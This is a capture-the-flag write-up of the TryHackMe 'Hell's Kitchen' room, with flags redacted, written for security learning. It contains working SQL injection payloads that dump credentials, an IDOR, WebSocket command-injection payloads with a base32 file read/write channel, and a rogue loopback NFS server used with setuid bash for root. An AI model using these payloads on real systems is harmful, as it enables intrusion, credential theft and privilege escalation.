---
description: "TryHackMe Hell's Kitchen — SQL injection in a base58 booking API leaks a login, an IDOR in the mail app hands over the web flag, and a timezone string sent over a WebSocket turns into shell command injection. From that 30-character blind foothold I build a full file-read and file-write channel out of base32, walk gilbert → sandra → jojo on reused passwords (one of them just printed on a photo), and — because the network blocks all outbound traffic — get root by running a home-made NFS server on the target's own loopback and mounting it with a setuid mount.nfs. Nine wrong turns kept in, including the one that wedged the box."
---

# Hell's Kitchen — a booking site, a mail app, and a root you have to host yourself

**TryHackMe · challenge: Hell's Kitchen · target (final lease): `10.128.129.255`**

> **All flags are redacted** here as `thm{[redacted]}`. Everything that teaches is intact: every
> command with every flag explained, the SQL injection oracle, the IDOR, the WebSocket command
> injection, the two encoding tricks that turn a one-token channel into arbitrary file read/write,
> the password reuse chain, and the from-scratch NFS server that gets root. The nine wrong turns are
> kept — a couple of them cost real time, and one froze the whole box.
>
> **What I kept and why:** the injection payloads, the base32/TZ encoding scheme, the NFS server
> design, and the mount options. Those are the lesson. The flag strings are just proof you were
> there.

A vocabulary note first, because the room assumes none. A **port** is a numbered door a service
answers on. A **shell** is a command interpreter; **RCE** is *remote code execution* — running your
commands on someone else's machine. **SQLi** is *SQL injection*: sneaking database commands into a
value the app puts into a query. **IDOR** is *insecure direct object reference*: asking for object
`#3` when you were only meant to see `#5`, and the server hands it over without checking. A
**WebSocket** is a long-lived two-way connection a web page keeps open to its server. **NFS** is the
*Network File System*, a way to mount a folder that lives on another machine. **setuid** is a bit on
a program file that makes it run as its *owner* (often root) no matter who launches it. Keep those
five or six ideas in your pocket and the whole box reads cleanly.

---

## 1. Recon — two web apps on odd ports

```bash
nmap -Pn -sT -p- --min-rate 1000 --open -oN allports.txt <target>
```

- `-Pn` — don't ping first (TryHackMe boxes often drop ping); just scan.
- `-sT` — full TCP connect scan (works without root, unlike the raw-socket `-sS`).
- `-p-` — all 65535 ports, not just the common 1000. A *port* is a numbered door; `-p-` knocks on
  every one.
- `--min-rate 1000` — send at least 1000 packets/sec so a full sweep finishes in minutes.
- `--open` — only report doors that answer.

Two ports answer: **80** (a hotel site, "Welcome to the 'Ton!") and **4346** (a second app,
"NYComm"). Everything interesting is on 4346; port 80 is a separate program running as root that
matters only at the very end.

The NYComm front page is a booking form. Reading its client-side JavaScript (always read the JS
first — it documents the API for you) shows it posts a **base58-encoded** `booking_id` to
`/api/booking-info`. Base58 is just a text encoding, like base64 without the confusing characters;
it is not security, it is a speed bump.

---

## 2. The web flag — SQL injection, then IDOR

### Wrong turn #1–#8 (compressed): I ruled out the injection that was there

The booking API validates its input by *doubling* single quotes and rejecting any lone quote with a
`400`. I read that as "correctly implemented, not injectable" and spent hours fuzzing route names
around it. That was backwards. Watch the two responses side by side, after base58-decoding the
payload the JS wraps for you:

```
booking_id = 1                 -> 404 not found      (valid query, zero rows)
booking_id = 1'                -> 400 bad request    (SQL syntax error!)
booking_id = 1''               -> 404               (the doubled quote is a VALID escaped quote)
booking_id = 1' OR '1'='1      -> 404
```

A quote that **errors sometimes and not others is the definition of injectable**. `400` there is the
database choking on a broken string literal, not a validator doing its job. Two lessons paid for in
hours: (1) don't carry a status code's meaning from one kind of input to another — re-derive it; and
(2) my "no injection" proof rested on `SLEEP()`/`pg_sleep()` payloads all returning instantly, but
the backend is **SQLite**, which implements none of those functions, so eleven "negative" results
were one untested assumption, not eleven facts.

### The injection, derived cleanly

`order by` counts the columns the query returns — the database errors when you order by a column
number that doesn't exist, so the last one that works is the count:

```
1' order by 2 -- -   -> 404   (ok)
1' order by 3 -- -   -> 400   (error)   => 2 columns
```

`-- -` is a SQL comment; it throws away the rest of the original query so your quote is balanced.
`UNION SELECT` then bolts your own row onto the result, and column 2 is reflected back to you:

```
1' UNION SELECT 1,sqlite_version() -- -        -> "3.42.0"      (it's SQLite)
1' UNION SELECT 1,group_concat(name)
   FROM sqlite_master WHERE type='table' -- -   -> email_access, reservations, bookings_temp
```

Dumping the credential table:

```
1' UNION SELECT 1,(SELECT group_concat(guest_name||' :: '||email_username||' :: '||email_password)
   FROM email_access) -- -
  -> Paul Denton :: pdenton :: 4321chameleon      (the only account with a password;
     the other five read "NEVER LOGGED IN")
```

So every password-spray I might have run against the guest book was doomed — only one of six guests
has ever had a password. **`pdenton` / `4321chameleon`.**

### Log in, then IDOR the mail

```
POST /  (user_name=pdenton&pass_word=4321chameleon)  -> 303 See Other, Location: /mail
                                                        Set-Cookie: id=...
```

The session cookie is named **`id`** — no cookie-*name* fuzzing could have found it, because a
correct name with a wrong value still returns 403. `/mail` lists five messages; its JavaScript fetches
`/api/message?message_id=<n>` and `atob()`s (base64-decodes) each body. The id is client-supplied —
textbook **IDOR**. Walking ids 0–7, message **3** (from `JReyes//UNATCO` to Paul Denton) carries the
**web flag: `thm{[redacted]}`.**

---

## 3. RCE — a timezone string that reaches a shell

The same `/mail` JavaScript opens `ws://<target>:4346/ws` and, once a second, sends the browser's
**timezone**; the server replies with a formatted local time. If that timezone string reaches a shell
unsanitised, command substitution `$(...)` runs:

```
$(whoami)  ->  "Fri 28 Aug 2026 07:03:54 AM gilbert"
```

**RCE as `gilbert`.** But this is a miserable little channel, and understanding *why* is the whole
game:

- **The output is a POSIX `TZ` string.** `date` only echoes it back when it looks like a valid
  timezone abbreviation — **3+ alphabetic characters, no `/`**. So `$(echo hi)` shows nothing (2
  chars), `$(which curl)` shows nothing (contains `/`), but `$(cd /usr/bin;ls curl)` shows `curl`
  (4 letters, no slash). Probes that look like failures are just output the sink swallowed.
- **The payload is capped at 30 characters.** Measured by bisection: 28 accepted, 38 rejected.
- **The service is single-worker.** One unbounded network command wedges it for everyone, and then
  even a 9-character payload times out. Every network command gets a `-m<seconds>` timeout.

You can *run* anything, but you can barely *see* anything: one short alphabetic word at a time.

### Turning a one-token channel into a full file reader

The trick is to make any file come back as a single long alphabetic run:

```
$(base32 /tmp/t|tr 2-7 a-f)
```

`base32` encodes arbitrary bytes into the alphabet `A–Z2–7`; `tr 2-7 a-f` remaps the six digits to
letters, so the whole output is pure `[A-Za-z]` — no slash, no space, no digit — and sails through
the TZ sink. Locally I reverse the `tr` and `base32 -d`. The WebSocket truncates a reply near ~80
characters, so my `read.py` stages the mapped file once and pulls it back in 60-character slices with
`$(cut -cA-B /tmp/c)` — each payload comfortably under the 30-char cap. Reassembled, it reads
`/etc/passwd` (users **gilbert**, **sandra**, **jojo**) or any file gilbert can read.

### And a full file writer

The inverse (`write.py`) lets me escape the 30-char cap entirely: base32-encode a local script, then
append it to the box 9 characters at a time —

```
$(printf %s <chunk>>>/tmp/e)      # repeat for each 9-char base32 chunk
$(base32 -d /tmp/e>/tmp/s)        # decode it back into a real file
```

Now I can drop a whole script and run it. That single capability makes every later step ordinary
shell work instead of a puzzle.

---

## 4. gilbert → sandra → jojo (password reuse, and a photo)

`/srv/.dad` is group-readable by gilbert:

> *"if you need access to the ton site, my pw is where id rather be: **anywherebuthere**. -S"*

That's Sandra's password. But `user.txt` is `rw-rw---- sandra:sandra`, so I need to *be* sandra — and
`su` refuses to read a password from a pipe; it demands a real terminal. So the dropped helper uses
Python's `pty.fork()` to hand `su` a pretend terminal and type the password into it:

```
su sandra -c 'cat /home/sandra/user.txt'    ->  uid=1002(sandra) ;  thm{[redacted]}
```

**User flag captured.** Sandra's `sudo -l` shows `(root) systemctl start|stop tonhotel`, and her
`Pictures/boss.jpg` is readable only as her. I copy it to `/tmp`, exfiltrate all 32637 bytes with the
read primitive (a valid JPEG, byte-perfect), and open it. No steghide needed — the picture literally
has text on it:

> **JoJo Fine: kingofhellskitchen**

**`jojo` / `kingofhellskitchen`.** And jojo's `sudo -l` is the prize:

```
(root) /usr/sbin/mount.nfs
```

`/usr/sbin/mount.nfs` is also **setuid-root** on disk. A note from "Decker" tells jojo orders will be
published on a "private NSF server mount". The room is pointing at NFS with a neon sign.

---

## 5. Root — when you can't reach out, host the NFS server *on the target*

The standard trick is: run an NFS server on **your** machine that exports a folder marked
`no_root_squash`, mount it on the victim as root, drop a setuid-root shell in it, run the shell. The
published walkthrough hosts that server on the attacker's port 80 — the one outbound port the hotel's
"check availability" feature needs.

**That path is dead here, and proving it mattered.** A ten-port catcher plus an uploaded sweep script
showed *every* outbound port — 80, 443, 2049, 111, 53, 8080, 8000, 30000, 4444, 9001 — returning
`000` with zero hits on my listener. Jojo's dad even says so in a note: "ports are blocked." The
target simply cannot reach my box. (I also ruled out the shortcuts: `pkexec` is patched against
PwnKit, there's no compiler, and the "world-writable" systemd units were symlinks to `/dev/null`.)

So I moved the NFS server **onto the target's own loopback**. I wrote a minimal **NFSv3 + MOUNTv3
server in Python** (~130 lines) that exports one file, `bash` — the target's *own* `/bin/bash` — and
reports it as **uid 0, mode 04755 (setuid root)**. I validated it locally first with a raw RPC client
(MNT returns a root handle, LOOKUP+GETATTR report the file as `04755` at bash's real size, READ
returns the `\x7fELF` header), then uploaded it with the write primitive and launched it on
`127.0.0.1:2049`.

Then, as jojo:

```bash
sudo /usr/sbin/mount.nfs -o vers=3,port=2049,mountport=2049,proto=tcp,\
     mountproto=tcp,nolock,nordirplus  127.0.0.1:/  /tmp/mnt
/tmp/mnt/bash -p -c 'id; cat /root/root.txt'
  ->  uid=1003(jojo) euid=0(root)
  ->  thm{[redacted]}
```

- `mount.nfs` runs as **real root** (via sudo), so the kernel trusts the uid/mode my server reports.
- `/tmp/mnt/bash` is therefore a **setuid-root** file. `-p` tells bash to *keep* the elevated euid
  instead of dropping it.
- With euid 0, `cat` reads `/root/root.txt`. **Root flag captured.**

No `no_root_squash`, no attacker server, no egress — the "server" and the "client" are the same box,
and the setuid bit is a value my own code chose to send.

---

## 6. Wrong turn #9 — NFS teardown order froze the box

Cleaning up, I killed the rogue NFS server **while the mount was still up**, then tried to run a
cleanup script *as* `/tmp/mnt/bash` — a binary that lives on the now-serverless mount. On a **hard**
NFS mount, reading a page whose server is gone blocks in uninterruptible I/O **forever**. NYComm is
single-worker, so that one frozen syscall wedged the entire command channel (port 4346 went dead for
both HTTP and WebSocket). Port 80 stayed up the whole time, which is how I knew the *box* was alive
and only my injection app was stuck.

The correct order, learned the hard way:

1. **Unmount before killing the server**, and never execute the cleanup binary from the mount you're
   removing — use a local shell or copy the binary off first.
2. The `umount` *binary* refuses for a non-root real user (it checks the real uid against
   `/etc/fstab`), so from a root-euid shell call the syscall directly:
   `python3 -c 'import ctypes; ctypes.CDLL(None).umount2(b"/tmp/mnt", 2)'` (2 = `MNT_DETACH`, lazy).
3. **Then** kill the server. **Then** remove the files.

Because the server was already dead when I understood this, the channel couldn't be recovered in the
session. Hell's Kitchen runs on a disposable VM, so the stale mount and `/tmp` scratch files vanish
on reset — but on a real engagement that ordering mistake is how you brick a client's service.

---

## Answers

| Flag | Value | How |
|---|---|---|
| Web  | `thm{[redacted]}` | SQLi → `pdenton` login → IDOR on `/api/message?message_id=3` |
| User | `thm{[redacted]}` | `.dad` note → `su sandra` (`anywherebuthere`) via a pty helper |
| Root | `thm{[redacted]}` | photo → `su jojo` → local rogue NFS server + `sudo mount.nfs` → setuid `bash -p` |

**The one idea to take away:** a bad output channel is not a wall — encode around it. A timezone
string that echoes one alphabetic word became a full file reader *and* writer through nothing but
`base32` and `tr`. And when the network won't let the textbook exploit reach you, bring the server
inside: the NFS root here works entirely on `127.0.0.1`.
